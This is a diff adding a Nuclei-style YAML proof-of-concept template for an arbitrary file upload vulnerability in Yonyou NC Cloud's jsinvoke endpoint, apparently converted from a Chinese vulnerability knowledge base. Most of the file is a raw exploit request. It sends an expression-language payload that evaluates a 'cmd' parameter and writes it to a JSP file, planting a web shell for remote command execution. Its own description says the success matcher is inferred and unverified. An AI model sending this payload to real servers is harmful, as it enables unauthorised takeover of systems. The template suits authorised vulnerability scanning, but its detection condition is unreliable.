@@ -1,0 +1,21 @@
+id: poc-qgkldihk9stz9px3
+info:
+  name: 用友 NC Cloud jsinvoke 任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qgkldihk9stz9px3
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: qgkldihk9stz9px3
+    fofa: 暂无
+http:
+- raw:
+  - "POST /uapjs/jsinvoke/?action=invoke  HTTP/1.1\n\nContent-Type: application/json\n\n\n\n{\n\n  \"serviceName\": \"nc.itf.iufo.IBaseSPService\",\n\n  \"methodName\": \"saveXStreamConfig\",\n\n  \"parameterTypes\": [\n\n    \"java.lang.Object\",\n\n    \"java.lang.String\"\n\n  ],\n\n  \"parameters\": [\n\n    \"${param.getClass().forName(param.error).newInstance().eval(param.cmd)}\",\n\n    \"webapps/nc_web/407.jsp\"\n\n  ]\n\n}\n\n# 响应代码特征\n-1\n\n# 响应内容特征\n暂无\n\n# 上传文件定位\n/407.jsp"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
